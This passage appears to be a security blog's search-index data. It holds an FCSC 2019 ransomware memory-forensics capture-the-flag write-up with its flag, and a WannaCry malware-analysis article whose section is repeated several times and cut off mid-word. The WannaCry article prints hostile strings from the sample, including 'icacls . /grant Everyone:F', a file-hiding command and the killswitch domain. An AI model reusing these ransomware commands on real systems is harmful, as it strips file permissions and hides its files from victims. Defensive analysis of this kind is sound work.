OneDrive.exe, ‚Ä¶). However, one of them looks suspicious. It is assistance.exe with PID 5208. PID PPID ImageFileName Offset(V) Threads Handles SessionId Wow64 CreateTime ExitTime *** 5208 3184 assistance.exe 0xe000106bb840 9 - 1 True 2019-05-08 20:00:16.000000 N/A Indeed, this is not a process we usually observe. To get to the bottom of it, let‚Äôs take a closer look. ","date":"2023-12-07","objectID":"/fcsc-2019-3615-incident-1/:2:3","series":["3615 Incident"],"tags":["Forensic","FCSC 2019","Volatility","Ransomware"],"title":"[FCSC 2019] - 3615 Incident (1/3)","uri":"/fcsc-2019-3615-incident-1/#analyse-des-processus"},{"categories":["Writeup"],"content":" Analysis of the binary assistance.exeTo learn more about assistance.exe, we first need to extract it from the memory dump. To do this, we can use various methods: Extract it using its PID. Simply use the windows.dumpfiles plugin with the --pid \u003cPID\u003e option. Find the location of the executable on the OS and extract it using the associated virtual address. The first method is more common (and practical), so we‚Äôll use the second. :) To scan the files in the memory image, we can use the windows.filescan plugin. What‚Äôs more, since we know the name of the executable, we can filter using grep. ‚îå‚îÄ‚îÄ(hashp4„âøkali)-[~/Bureau] ‚îî‚îÄ$ python3 ~/Tools/volatility3/vol.py -f ~/Bureau/mem.dmp windows.filescan | grep \"assistance.exe\" 0xe00011360090.0\\Users\\TNKLSAI3TGT7O9\\Downloads\\assistance.exe 216 0xe00011483b40 \\Users\\TNKLSAI3TGT7O9\\Downloads\\assistance.exe 216 0xe000121df450 \\Users\\TNKLSAI3TGT7O9\\Downloads\\assistance.exe 216 0xe0001256bde0 \\;Z:000000000002acd3\\vmware-host\\Shared Folders\\e\\assistance.exe 216 We can see that it has several different addresses. We can take one of these. Next, we need to dump the executable. Here, we use the windows.dumpfiles plugin. It comes with the --virtaddr \u003cADDR\u003e option, which lets you specify the virtual address you‚Äôve just found. ‚îå‚îÄ‚îÄ(hashp4„âøkali)-[~/Bureau] ‚îî‚îÄ$ python3 ~/Tools/volatility3/vol.py -f ~/Bureau/mem.dmp -o /tmp/fcsc/dump windows.dumpfiles --virtaddr 0xe00011483b40 Volatility 3 Framework 2.5.2 Progress: 100.00 PDB scanning finished Cache FileObject FileName Result DataSectionObject 0xe00011483b40 assistance.exe file.0xe00011483b40.0xe000121e98b0.DataSectionObject.assistance.exe.dat ImageSectionObject 0xe00011483b40 assistance.exe file.0xe00011483b40.0xe0001219c830.ImageSectionObject.assistance.exe.img (the -o option is used to specify the destination directory for the executable). Now that we have the executable, let‚Äôs quickly check that it‚Äôs actually one, using the file command. ‚îå‚îÄ‚îÄ(hashp4„âøkali)-[~/Bureau] ‚îî‚îÄ$ file /tmp/fcsc/dump/file.0xe00011483b40.0xe000121e98b0.DataSectionObject.assistance.exe.dat [...] PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows, 6 sections Everything looks good! Now let‚Äôs check if it‚Äôs malware. If so, it‚Äôs probably recognized by VirusTotal. We can then download the executable. Clearly, this is malware belonging to the ransomware family. Let‚Äôs delve a little deeper into the analysis by opening it in PEStudio. This is a tool for quickly finding artifacts (information of investigative value) within an executable. Browsing the strings section, we notice the presence of a Github repo: https://github.com/mauri870/ransomware. It probably contains the ransomware‚Äôs source code. What a bargain! At this stage of the challenge, we have 2/3 of the flag: ECSC{assistance.exe:5208. the name of this ransomware‚Äôs executable file, its Process ID (PID), the SHA1 of the file name flag.docx once encrypted. Now all we need to do is find the last item in this list. We‚Äôll now be able to use the source code now available to us. ","date":"2023-12-07","objectID":"/fcsc-2019-3615-incident-1/:2:4","series":["3615 Incident"],"tags":["Forensic","FCSC 2019","Volatility","Ransomware"],"title":"[FCSC 2019] - 3615 Incident (1/3)","uri":"/fcsc-2019-3615-incident-1/#analysis-of-the-binary-assistanceexe"},{"categories":["Writeup"],"content":" 2. Searching for flag.docx üß≠","date":"2023-12-07","objectID":"/fcsc-2019-3615-incident-1/:3:0","series":["3615 Incident"],"tags":["Forensic","FCSC 2019","Volatility","Ransomware"],"title":"[FCSC 2019] - 3615 Incident (1/3)","uri":"/fcsc-2019-3615-incident-1/#2-searching-for-flagdocx-"},{"categories":["Writeup"],"content":" Quick source code analysisTo understand how encryption works, we need to analyze the file ransomware.go located in /cmd/ransomware. Inside, we find the encryptFiles() function which, as its name suggests, is in charge of encrypting files. *(As it‚Äôs quite large, I‚Äôve shortened it to the interesting part (from line 256 to 268)). func encryptFiles() { [...] // Rename the files after all have been encrypted cmd.Logger.Println(\"Renaming files...\") for _, file := range FilesToRename.Files { // Replace the file name by the base64 equivalent newpath := strings.Replace(file.Path, file.Name(), base64.StdEncoding.EncodeToString([]byte(file.Name())), -1) cmd.Logger.Printf(\"Renaming %s to %s\\n\", file.Path, newpath) // Rename the original file to the base64 equivalent err := utils.RenameFile(file.Path, newpath+cmd.EncryptionExtension) if err != nil { cmd.Logger.Println(err) continue } [...] We can see that this function renames files after encrypting them. The substitution name is the name of the original file encoded in base64, to which is added an extension defined by the attacker in the file common.go (line 99). // Extension appended to files after encryption EncryptionExtension = \".encrypted\" ","date":"2023-12-07","objectID":"/fcsc-2019-3615-incident-1/:3:1","series":["3615 Incident"],"tags":["Forensic","FCSC 2019","Volatility","Ransomware"],"title":"[FCSC 2019] - 3615 Incident (1/3)","uri":"/fcsc-2019-3615-incident-1/#quick-source-code-analysis"},{"categories":["Writeup"],"content":" Locating the encrypted file in the memory dumpWe now know that the hypothetical name of flag.docx after encryption is this one encoded in base64. We can obtain the string as follows: ‚îå‚îÄ‚îÄ(hashp4„âøkali)-[~/Bureau] ‚îî‚îÄ$ echo -n \"flag.docx\" | base64 ZmxhZy5kb2N4 We can now search for a file with the name ZmxhZy5kb2N4 in the memory dump. To do this, we‚Äôll use the windows.filescan plugin and filter on the filename using grep. ‚îå‚îÄ‚îÄ(hashp4„âøkali)-[~/Bureau] ‚îî‚îÄ$ python3 ~/Tools/volatility3/vol.py -f ~/Bureau/mem.dmp windows.filescan | grep \"ZmxhZy5kb2N4\" 0xe000123988d0.0\\ZmxhZy5kb2N4.chiffr√© 216 Indeed, the file does exist. We also notice that the file extension is no longer .encrypted but .chiffr√©. All we have to do now is calculate the SHA1 of the full filename using sha1sum : ‚îå‚îÄ‚îÄ(hashp4„âøkali)-[~/Bureau] ‚îî‚îÄ$ echo -n \"ZmxhZy5kb2N4.chiffr√©\" | sha1sum c9a12b109a58361ff1381fceccdcdcade3ec595a This gives us the last piece of the flag: :c9a12b109a58361ff1381fceccdcdcade3ec595a}, so we can check off the last item in our list. the SHA1 of the file name flag.docx once encrypted. ","date":"2023-12-07","objectID":"/fcsc-2019-3615-incident-1/:3:2","series":["3615 Incident"],"tags":["Forensic","FCSC 2019","Volatility","Ransomware"],"title":"[FCSC 2019] - 3615 Incident (1/3)","uri":"/fcsc-2019-3615-incident-1/#locating-the-encrypted-file-in-the-memory-dump"},{"categories":["Writeup"],"content":" 3. Flag üö©Our analysis yields the following flag: ECSC{assistance.exe:5208:c9a12b109a58361ff1381fceccdcdcade3ec595a}. This concludes the first part of the 3615 Incident challenge. I hope this writeup has helped you understand the ins and outs of this challenge. Good luck for the second part! :) ","date":"2023-12-07","objectID":"/fcsc-2019-3615-incident-1/:4:0","series":["3615 Incident"],"tags":["Forensic","FCSC 2019","Volatility","Ransomware"],"title":"[FCSC 2019] - 3615 Incident (1/3)","uri":"/fcsc-2019-3615-incident-1/#3-flag-"},{"categories":["Article"],"content":" Difficulty Start Date \u0026 Time Finish Date \u0026 Time Medium 24/11/2023 - 16h45 26/11/2023 - 19h30 ","date":"2023-11-26","objectID":"/malware-analysis-wannacry-pt1/:0:0","series":null,"tags":["Malware","PMAT","WannaCry","Cutter","x64dbg","Procmon"],"title":"Malware Analysis : WannaCry (part 1)","uri":"/malware-analysis-wannacry-pt1/#"},{"categories":["Article"],"content":" IntroductionIn the early summer of 2017, WannaCry was unleashed on the world. Widely considered to be one of the most devastating malware infections to date, WannaCry left a trail of destruction in its wake. WannaCry is a classic ransomware sample; more specifically, it is a ransomware cryptoworm, which means that it can encrypt individual hosts and had the capability to propagate through a network on its own. (If you want more information about WannaCry, I strongly recommand you to listen to Darknet Diaries‚Äôs podcast on the subject: https://darknetdiaries.com/episode/73/) ","date":"2023-11-26","objectID":"/malware-analysis-wannacry-pt1/:1:0","series":null,"tags":["Malware","PMAT","WannaCry","Cutter","x64dbg","Procmon"],"title":"Malware Analysis : WannaCry (part 1)","uri":"/malware-analysis-wannacry-pt1/#introduction"},{"categories":["Article"],"content":" Objective Perform a full analysis of WannaCry and answer the questions below. ","date":"2023-11-26","objectID":"/malware-analysis-wannacry-pt1/:2:0","series":null,"tags":["Malware","PMAT","WannaCry","Cutter","x64dbg","Procmon"],"title":"Malware Analysis : WannaCry (part 1)","uri":"/malware-analysis-wannacry-pt1/#objective"},{"categories":["Article"],"content":" Tools","date":"2023-11-26","objectID":"/malware-analysis-wannacry-pt1/:3:0","series":null,"tags":["Malware","PMAT","WannaCry","Cutter","x64dbg","Procmon"],"title":"Malware Analysis : WannaCry (part 1)","uri":"/malware-analysis-wannacry-pt1/#tools"},{"categories":["Article"],"content":" Basic Analysis File hashes VirusTotal FLOSS PEStudio PEView Wireshark Inetsim TCPView Procmon ","date":"2023-11-26","objectID":"/malware-analysis-wannacry-pt1/:3:1","series":null,"tags":["Malware","PMAT","WannaCry","Cutter","x64dbg","Procmon"],"title":"Malware Analysis : WannaCry (part 1)","uri":"/malware-analysis-wannacry-pt1/#basic-analysis"},{"categories":["Article"],"content":" Advanced Analysis Cutter Debugger (x64dbg) ","date":"2023-11-26","objectID":"/malware-analysis-wannacry-pt1/:3:2","series":null,"tags":["Malware","PMAT","WannaCry","Cutter","x64dbg","Procmon"],"title":"Malware Analysis : WannaCry (part 1)","uri":"/malware-analysis-wannacry-pt1/#advanced-analysis"},{"categories":["Article"],"content":" Basic FactsSHA256: 24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c MD5: db349b97c37d22f5ea1d1841e3c89eb4 VirusTotal: Obviously, the file was flagged as malicious. It‚Äôs flagged by 70 security vendors and the most popular threat label is wannacry. I might as well tell you that it‚Äôs spotted miles away. But for the purpose of this challenge, I won‚Äôt take it in consideration in order to find everything by myself, as if I was the first person to be infected by WannaCry üòº! How lucky‚Ä¶ ","date":"2023-11-26","objectID":"/malware-analysis-wannacry-pt1/:4:0","series":null,"tags":["Malware","PMAT","WannaCry","Cutter","x64dbg","Procmon"],"title":"Malware Analysis : WannaCry (part 1)","uri":"/malware-analysis-wannacry-pt1/#basic-facts"},{"categories":["Article"],"content":" Challenge Questions Record any observed symptoms of infection from initial detonation. What are the main symptoms of a WannaCry infection?When detonating WannaCry for the first time, I noticed several symptoms of infection. Different files were created or modified @Please_Read_Me@.txt: it contains a brief explanation of what happened and the instructions on how to fix it (i.e how to pay the ransom and get my files decrypted). @WanaDecryptor@.exe: . this is the binary in charge of decrypting my files when the ransom will be paid. In the meantime, it gives different informations (detailed below). I also noticed that most of my executable files were modified to @WanaDecryptor@.exe. Below you will find a screenshot of the associated window. @WanaDecryptor@.exe.lnk: this is a shortcut to @WanaDecryptor@.exe. I noticed that most of my shortcuts were modified to point on it. @WanaDecryptor@.bmp: this is the new desktop wallpaper that will be replacing . [filename].WNCRY: I noticed most of my files were encrypted and their name appended with this extension. The desktop background has been replaced by this ‚ú®cute‚ú® message : The following pop-up window appeared. It can be spawned manually by executing @WanaDecryptor@.exe. I can see a lot of informations. On the left when will the payment be raised on, when my files will be lost on, what is bitcoin and how to buy it. In the main window informations on what happened to my computer, informations on how to recover my files, informations on how to pay contact details. On the bottom the amount in dollars of the ransom, the bitcoin address to which payment should be sent, a Check Payment button, a Decrypt button. Use FLOSS and extract the strings from the main WannaCry binary. Are there any strings of interest?Using FLOSS, I extracted several interesting strings from the main WannaCry binary. First of all I noticed the following : C:\\%s\\qeriuwjhrf tasksche.exe http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com The first string is an absolute path to a file. At this point, I have no idea of what it could be but its name is composed of random letters probably to hide its real meaning and purpose. The second string is the name of an EXE file (tasksche.exe) similar to the official one for the Task Scheduler which is taskschd.exe ü§î. The third string is an URL to a strange website composed of random characters. It‚Äôs probably used later during the execution of the malware. Then, I noticed some more interesting strings associated to cryptography and command execution. CryptGenKey CryptDecrypt CryptEncrypt ... cmd.exe /c \"%s\" icacls . /grant Everyone:F /T /C /Q attrib +h . WNcry@2o17 It looks like this malware is using cryptographic functions from the header wincrypt.h, probably to encrypt files. Also, I can see some system commands like cmd.exe /c or icacls related to file and directory access control lists. and attrib +h . which is setting the hidden file attribute. Additionnally, I noticed the string WNcry@2o17. I don‚Äôt know what is its purpose but from my perspective it looks like a password or something like that. I also noticed UNC (Universal Naming Convention) paths. This is a mean to specify location of network resources in the context of a LAN. \\\\172.16.99.5\\IPC$ \\\\192.168.56.20\\IPC$ WanaCrypt0r Here, both of the UNC paths are leading to the IPC$ share. Microsoft officially state : ‚ÄúThe IPC$ share is also known as a null session connection. By using this session, Windows lets anonymous users perform certain activities, such as enumerating the names of domain accounts and network shares.‚Äù So WannaCry is probably enumerating systems for specific informations it needs. WanaCrypt0r is also a string that attracted my attention. I suppose it‚Äôs probably the name of a function or a binary. Finally, these are the last couple of strings I noticed. SMBr SMBs PC NETWORK Program 1.0 LAN MAN1.0 6.1.7601.17514 (win7sp1_rtm.101119-1850) The first couple of strings are related to the usage of the SMB (Se","date":"2023-11-26","objectID":"/malware-analysis-wannacry-pt1/:5:0","series":null,"tags":["Malware","PMAT","WannaCry","Cutter","x64dbg","Procmon"],"title":"Malware Analysis : WannaCry (part 1)","uri":"/malware-analysis-wannacry-pt1/#challenge-questions"},{"categories":["Article"],"content":" Challenge Questions Record any observed symptoms of infection from initial detonation. What are the main symptoms of a WannaCry infection?When detonating WannaCry for the first time, I noticed several symptoms of infection. Different files were created or modified @Please_Read_Me@.txt: it contains a brief explanation of what happened and the instructions on how to fix it (i.e how to pay the ransom and get my files decrypted). @WanaDecryptor@.exe: . this is the binary in charge of decrypting my files when the ransom will be paid. In the meantime, it gives different informations (detailed below). I also noticed that most of my executable files were modified to @WanaDecryptor@.exe. Below you will find a screenshot of the associated window. @WanaDecryptor@.exe.lnk: this is a shortcut to @WanaDecryptor@.exe. I noticed that most of my shortcuts were modified to point on it. @WanaDecryptor@.bmp: this is the new desktop wallpaper that will be replacing . [filename].WNCRY: I noticed most of my files were encrypted and their name appended with this extension. The desktop background has been replaced by this ‚ú®cute‚ú® message : The following pop-up window appeared. It can be spawned manually by executing @WanaDecryptor@.exe. I can see a lot of informations. On the left when will the payment be raised on, when my files will be lost on, what is bitcoin and how to buy it. In the main window informations on what happened to my computer, informations on how to recover my files, informations on how to pay contact details. On the bottom the amount in dollars of the ransom, the bitcoin address to which payment should be sent, a Check Payment button, a Decrypt button. Use FLOSS and extract the strings from the main WannaCry binary. Are there any strings of interest?Using FLOSS, I extracted several interesting strings from the main WannaCry binary. First of all I noticed the following : C:\\%s\\qeriuwjhrf tasksche.exe http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com The first string is an absolute path to a file. At this point, I have no idea of what it could be but its name is composed of random letters probably to hide its real meaning and purpose. The second string is the name of an EXE file (tasksche.exe) similar to the official one for the Task Scheduler which is taskschd.exe ü§î. The third string is an URL to a strange website composed of random characters. It‚Äôs probably used later during the execution of the malware. Then, I noticed some more interesting strings associated to cryptography and command execution. CryptGenKey CryptDecrypt CryptEncrypt ... cmd.exe /c \"%s\" icacls . /grant Everyone:F /T /C /Q attrib +h . WNcry@2o17 It looks like this malware is using cryptographic functions from the header wincrypt.h, probably to encrypt files. Also, I can see some system commands like cmd.exe /c or icacls related to file and directory access control lists. and attrib +h . which is setting the hidden file attribute. Additionnally, I noticed the string WNcry@2o17. I don‚Äôt know what is its purpose but from my perspective it looks like a password or something like that. I also noticed UNC (Universal Naming Convention) paths. This is a mean to specify location of network resources in the context of a LAN. \\\\172.16.99.5\\IPC$ \\\\192.168.56.20\\IPC$ WanaCrypt0r Here, both of the UNC paths are leading to the IPC$ share. Microsoft officially state : ‚ÄúThe IPC$ share is also known as a null session connection. By using this session, Windows lets anonymous users perform certain activities, such as enumerating the names of domain accounts and network shares.‚Äù So WannaCry is probably enumerating systems for specific informations it needs. WanaCrypt0r is also a string that attracted my attention. I suppose it‚Äôs probably the name of a function or a binary. Finally, these are the last couple of strings I noticed. SMBr SMBs PC NETWORK Program 1.0 LAN MAN1.0 6.1.7601.17514 (win7sp1_rtm.101119-1850) The first couple of strings are related to the usage of the SMB (Se","date":"2023-11-26","objectID":"/malware-analysis-wannacry-pt1/:5:0","series":null,"tags":["Malware","PMAT","WannaCry","Cutter","x64dbg","Procmon"],"title":"Malware Analysis : WannaCry (part 1)","uri":"/malware-analysis-wannacry-pt1/#record-any-observed-symptoms-of-infection-from-initial-detonation-what-are-the-main-symptoms-of-a-wannacry-infection"},{"categories":["Article"],"content":" Challenge Questions Record any observed symptoms of infection from initial detonation. What are the main symptoms of a WannaCry infection?When detonating WannaCry for the first time, I noticed several symptoms of infection. Different files were created or modified @Please_Read_Me@.txt: it contains a brief explanation of what happened and the instructions on how to fix it (i.e how to pay the ransom and get my files decrypted). @WanaDecryptor@.exe: . this is the binary in charge of decrypting my files when the ransom will be paid. In the meantime, it gives different informations (detailed below). I also noticed that most of my executable files were modified to @WanaDecryptor@.exe. Below you will find a screenshot of the associated window. @WanaDecryptor@.exe.lnk: this is a shortcut to @WanaDecryptor@.exe. I noticed that most of my shortcuts were modified to point on it. @WanaDecryptor@.bmp: this is the new desktop wallpaper that will be replacing . [filename].WNCRY: I noticed most of my files were encrypted and their name appended with this extension. The desktop background has been replaced by this ‚ú®cute‚ú® message : The following pop-up window appeared. It can be spawned manually by executing @WanaDecryptor@.exe. I can see a lot of informations. On the left when will the payment be raised on, when my files will be lost on, what is bitcoin and how to buy it. In the main window informations on what happened to my computer, informations on how to recover my files, informations on how to pay contact details. On the bottom the amount in dollars of the ransom, the bitcoin address to which payment should be sent, a Check Payment button, a Decrypt button. Use FLOSS and extract the strings from the main WannaCry binary. Are there any strings of interest?Using FLOSS, I extracted several interesting strings from the main WannaCry binary. First of all I noticed the following : C:\\%s\\qeriuwjhrf tasksche.exe http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com The first string is an absolute path to a file. At this point, I have no idea of what it could be but its name is composed of random letters probably to hide its real meaning and purpose. The second string is the name of an EXE file (tasksche.exe) similar to the official one for the Task Scheduler which is taskschd.exe ü§î. The third string is an URL to a strange website composed of random characters. It‚Äôs probably used later during the execution of the malware. Then, I noticed some more interesting strings associated to cryptography and command execution. CryptGenKey CryptDecrypt CryptEncrypt ... cmd.exe /c \"%s\" icacls . /grant Everyone:F /T /C /Q attrib +h . WNcry@2o17 It looks like this malware is using cryptographic functions from the header wincrypt.h, probably to encrypt files. Also, I can see some system commands like cmd.exe /c or icacls related to file and directory access control lists. and attrib +h . which is setting the hidden file attribute. Additionnally, I noticed the string WNcry@2o17. I don‚Äôt know what is its purpose but from my perspective it looks like a password or something like that. I also noticed UNC (Universal Naming Convention) paths. This is a mean to specify location of network resources in the context of a LAN. \\\\172.16.99.5\\IPC$ \\\\192.168.56.20\\IPC$ WanaCrypt0r Here, both of the UNC paths are leading to the IPC$ share. Microsoft officially state : ‚ÄúThe IPC$ share is also known as a null session connection. By using this session, Windows lets anonymous users perform certain activities, such as enumerating the names of domain accounts and network shares.‚Äù So WannaCry is probably enumerating systems for specific informations it needs. WanaCrypt0r is also a string that attracted my attention. I suppose it‚Äôs probably the name of a function or a binary. Finally, these are the last couple of strings I noticed. SMBr SMBs PC NETWORK Program 1.0 LAN MAN1.0 6.1.7601.17514 (win7sp1_rtm.101119-1850) The first couple of strings are related to the usage of the SMB (Se","date":"2023-11-26","objectID":"/malware-analysis-wannacry-pt1/:5:0","series":null,"tags":["Malware","PMAT","WannaCry","Cutter","x64dbg","Procmon"],"title":"Malware Analysis : WannaCry (part 1)","uri":"/malware-analysis-wannacry-pt1/#use-floss-and-extract-the-strings-from-the-main-wannacry-binary-are-there-any-strings-of-interest"},{"categories":["Article"],"content":" Challenge Questions Record any observed symptoms of infection from initial detonation. What are the main symptoms of a WannaCry infection?When detonating WannaCry for the first time, I noticed several symptoms of infection. Different files were created or modified @Please_Read_Me@.txt: it contains a brief explanation of what happened and the instructions on how to fix it (i.e how to pay the ransom and get my files decrypted). @WanaDecryptor@.exe: . this is the binary in charge of decrypting my files when the ransom will be paid. In the meantime, it gives different informations (detailed below). I also noticed that most of my executable files were modified to @WanaDecryptor@.exe. Below you will find a screenshot of the associated window. @WanaDecryptor@.exe.lnk: this is a shortcut to @WanaDecryptor@.exe. I noticed that most of my shortcuts were modified to point on it. @WanaDecryptor@.bmp: this is the new desktop wallpaper that will be replacing . [filename].WNCRY: I noticed most of my files were encrypted and their name appended with this extension. The desktop background has been replaced by this ‚ú®cute‚ú® message : The following pop-up window appeared. It can be spawned manually by executing @WanaDecryptor@.exe. I can see a lot of informations. On the left when will the payment be raised on, when my files will be lost on, what is bitcoin and how to buy it. In the main window informations on what happened to my computer, informations on how to recover my files, informations on how to pay contact details. On the bottom the amount in dollars of the ransom, the bitcoin address to which payment should be sent, a Check Payment button, a Decrypt button. Use FLOSS and extract the strings from the main WannaCry binary. Are there any strings of interest?Using FLOSS, I extracted several interesting strings from the main WannaCry binary. First of all I noticed the following : C:\\%s\\qeriuwjhrf tasksche.exe http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com The first string is an absolute path to a file. At this point, I have no idea of what it could be but its name is composed of random letters probably to hide its real meaning and purpose. The second string is the name of an EXE file (tasksche.exe) similar to the official one for the Task Scheduler which is taskschd.exe ü§î. The third string is an URL to a strange website composed of random characters. It‚Äôs probably used later during the execution of the malware. Then, I noticed some more interesting strings associated to cryptography and command execution. CryptGenKey CryptDecrypt CryptEncrypt ... cmd.exe /c \"%s\" icacls . /grant Everyone:F /T /C /Q attrib +h . WNcry@2o17 It looks like this malware is using cryptographic functions from the header wincrypt.h, probably to encrypt files. Also, I can see some system commands like cmd.exe /c or icacls related to file and directory access control lists. and attrib +h . which is setting the hidden file attribute. Additionnally, I noticed the string WNcry@2o17. I don‚Äôt know what is its purpose but from my perspective it looks like a password or something like that. I also noticed UNC (Universal Naming Convention) paths. This is a mean to specify location of network resources in the context of a LAN. \\\\172.16.99.5\\IPC$ \\\\192.168.56.20\\IPC$ WanaCrypt0r Here, both of the UNC paths are leading to the IPC$ share. Microsoft officially state : ‚ÄúThe IPC$ share is also known as a null session connection. By using this session, Windows lets anonymous users perform certain activities, such as enumerating the names of domain accounts and network shares.‚Äù So WannaCry is probably enumerating systems for specific informations it needs. WanaCrypt0r is also a string that attracted my attention. I suppose it‚Äôs probably the name of a function or a binary. Finally, these are the last couple of strings I noticed. SMBr SMBs PC NETWORK Program 1.0 LAN MAN1.0 6.1.7601.17514 (win7sp1_rtm.101119-1850) The first couple of strings are related to the usage of the SMB (Se","date":"2023-11-26","objectID":"/malware-analysis-wannacry-pt1/:5:0","series":null,"tags":["Malware","PMAT","WannaCry","Cutter","x64dbg","Procmon"],"title":"Malware Analysis : WannaCry (part 1)","uri":"/malware-analysis-wannacry-pt1/#inspect-the-import-address-table-for-the-main-wannacry-binary-are-there-any-notable-api-imports"},{"categories":["Article"],"content":" Challenge Questions Record any observed symptoms of infection from initial detonation. What are the main symptoms of a WannaCry infection?When detonating WannaCry for the first time, I noticed several symptoms of infection. Different files were created or modified @Please_Read_Me@.txt: it contains a brief explanation of what happened and the instructions on how to fix it (i.e how to pay the ransom and get my files decrypted). @WanaDecryptor@.exe: . this is the binary in charge of decrypting my files when the ransom will be paid. In the meantime, it gives different informations (detailed below). I also noticed that most of my executable files were modified to @WanaDecryptor@.exe. Below you will find a screenshot of the associated window. @WanaDecryptor@.exe.lnk: this is a shortcut to @WanaDecryptor@.exe. I noticed that most of my shortcuts were modified to point on it. @WanaDecryptor@.bmp: this is the new desktop wallpaper that will be replacing . [filename].WNCRY: I noticed most of my files were encrypted and their name appended with this extension. The desktop background has been replaced by this ‚ú®cute‚ú® message : The following pop-up window appeared. It can be spawned manually by executing @WanaDecryptor@.exe. I can see a lot of informations. On the left when will the payment be raised on, when my files will be lost on, what is bitcoin and how to buy it. In the main window informations on what happened to my computer, informations on how to recover my files, informations on how to pay contact details. On the bottom the amount in dollars of the ransom, the bitcoin address to which payment should be sent, a Check Payment button, a Decrypt button. Use FLOSS and extract the strings from the main WannaCry binary. Are there any strings of interest?Using FLOSS, I extracted several interesting strings from the main WannaCry binary. First of all I noticed the following : C:\\%s\\qeriuwjhrf tasksche.exe http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com The first string is an absolute path to a file. At this point, I have no idea of what it could be but its name is composed of random letters probably to hide its real meaning and purpose. The second string is the name of an EXE file (tasksche.exe) similar to the official one for the Task Scheduler which is taskschd.exe ü§î. The third string is an URL to a strange website composed of random characters. It‚Äôs probably used later during the execution of the malware. Then, I noticed some more interesting strings associated to cryptography and command execution. CryptGenKey CryptDecrypt CryptEncrypt ... cmd.exe /c \"%s\" icacls . /grant Everyone:F /T /C /Q attrib +h . WNcry@2o17 It looks like this malware is using cryptographic functions from the header wincrypt.h, probably to encrypt files. Also, I can see some system commands like cmd.exe /c or icacls related to file and directory access control lists. and attrib +h . which is setting the hidden file attribute. Additionnally, I noticed the string WNcry@2o17. I don‚Äôt know what is its purpose but from my perspective it looks like a password or something like that. I also noticed UNC (Universal Naming Convention) paths. This is a mean to specify location of network resources in the context of a LAN. \\\\172.16.99.5\\IPC$ \\\\192.168.56.20\\IPC$ WanaCrypt0r Here, both of the UNC paths are leading to the IPC$ share. Microsoft officially state : ‚ÄúThe IPC$ share is also known as a null session connection. By using this session, Windows lets anonymous users perform certain activities, such as enumerating the names of domain accounts and network shares.‚Äù So WannaCry is probably enumerating systems for specific informations it needs. WanaCrypt0r is also a string that attracted my attention. I suppose it‚Äôs probably the name of a function or a binary. Finally, these are the last couple of strings I noticed. SMBr SMBs PC NETWORK Program 1.0 LAN MAN1.0 6.1.7601.17514 (win7sp1_rtm.101119-1850) The first couple of strings are related to the usage of the SMB (Se","date":"2023-11-26","objectID":"/malware-analysis-wannacry-pt1/:5:0","series":null,"tags":["Malware","PMAT","WannaCry","Cutter","x64dbg","Procmon"],"title":"Malware Analysis : WannaCry (part 1)","uri":"/malware-analysis-wannacry-pt1/#what-conditions-are-necessary-to-get-this-sample-to-detonate"},{"categories":["Article"],"content":" Challenge Questions Record any observed symptoms of infection from initial detonation. What are the main symptoms of a WannaCry infection?When detonating WannaCry for the first time, I noticed several symptoms of infection. Different files were created or modified @Please_Read_Me@.txt: it contains a brief explanation of what happened and the instructions on how to fix it (i.e how to pay the ransom and get my files decrypted). @WanaDecryptor@.exe: . this is the binary in charge of decrypting my files when the ransom will be paid. In the meantime, it gives different informations (detailed below). I also noticed that most of my executable files were modified to @WanaDecryptor@.exe. Below you will find a screenshot of the associated window. @WanaDecryptor@.exe.lnk: this is a shortcut to @WanaDecryptor@.exe. I noticed that most of my shortcuts were modified to point on it. @WanaDecryptor@.bmp: this is the new desktop wallpaper that will be replacing . [filename].WNCRY: I noticed most of my files were encrypted and their name appended with this extension. The desktop background has been replaced by this ‚ú®cute‚ú® message : The following pop-up window appeared. It can be spawned manually by executing @WanaDecryptor@.exe. I can see a lot of informations. On the left when will the payment be raised on, when my files will be lost on, what is bitcoin and how to buy it. In the main window informations on what happened to my computer, informations on how to recover my files, informations on how to pay contact details. On the bottom the amount in dollars of the ransom, the bitcoin address to which payment should be sent, a Check Payment button, a Decrypt button. Use FLOSS and extract the strings from the main WannaCry binary. Are there any strings of interest?Using FLOSS, I extracted several interesting strings from the main WannaCry binary. First of all I noticed the following : C:\\%s\\qeriuwjhrf tasksche.exe http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com The first string is an absolute path to a file. At this point, I have no idea of what it could be but its name is composed of random letters probably to hide its real meaning and purpose. The second string is the name of an EXE file (tasksche.exe) similar to the official one for the Task Scheduler which is taskschd.exe ü§î. The third string is an URL to a strange website composed of random characters. It‚Äôs probably used later during the execution of the malware. Then, I noticed some more interesting strings associated to cryptography and command execution. CryptGenKey CryptDecrypt CryptEncrypt ... cmd.exe /c \"%s\" icacls . /grant Everyone:F /T /C /Q attrib +h . WNcry@2o17 It looks like this malware is using cryptographic functions from the header wincrypt.h, probably to encrypt files. Also, I can see some system commands like cmd.exe /c or icacls related to file and directory access control lists. and attrib +h . which is setting the hidden file attribute. Additionnally, I noticed the string WNcry@2o17. I don‚Äôt know what is its purpose but from my perspective it looks like a password or something like that. I also noticed UNC (Universal Naming Convention) paths. This is a mean to specify location of network resources in the context of a LAN. \\\\172.16.99.5\\IPC$ \\\\192.168.56.20\\IPC$ WanaCrypt0r Here, both of the UNC paths are leading to the IPC$ share. Microsoft officially state : ‚ÄúThe IPC$ share is also known as a null session connection. By using this session, Windows lets anonymous users perform certain activities, such as enumerating the names of domain accounts and network shares.‚Äù So WannaCry is probably enumerating systems for specific informations it needs. WanaCrypt0r is also a string that attracted my attention. I suppose it‚Äôs probably the name of a function or a binary. Finally, these are the last couple of strings I noticed. SMBr SMBs PC NETWORK Program 1.0 LAN MAN1.0 6.1.7601.17514 (win7sp1_rtm.101119-1850) The first couple of strings are related to the usage of the SMB (Se","date":"2023-11-26","objectID":"/malware-analysis-wannacry-pt1/:5:0","series":null,"tags":["Malware","PMAT","WannaCry","Cutter","x64dbg","Procmon"],"title":"Malware Analysis : WannaCry (part 1)","uri":"/malware-analysis-wannacry-pt1/#network-indicators-identify-the-network-indicators-of-this-malware"},{"categories":["Article"],"content":" Challenge Questions Record any observed symptoms of infection from 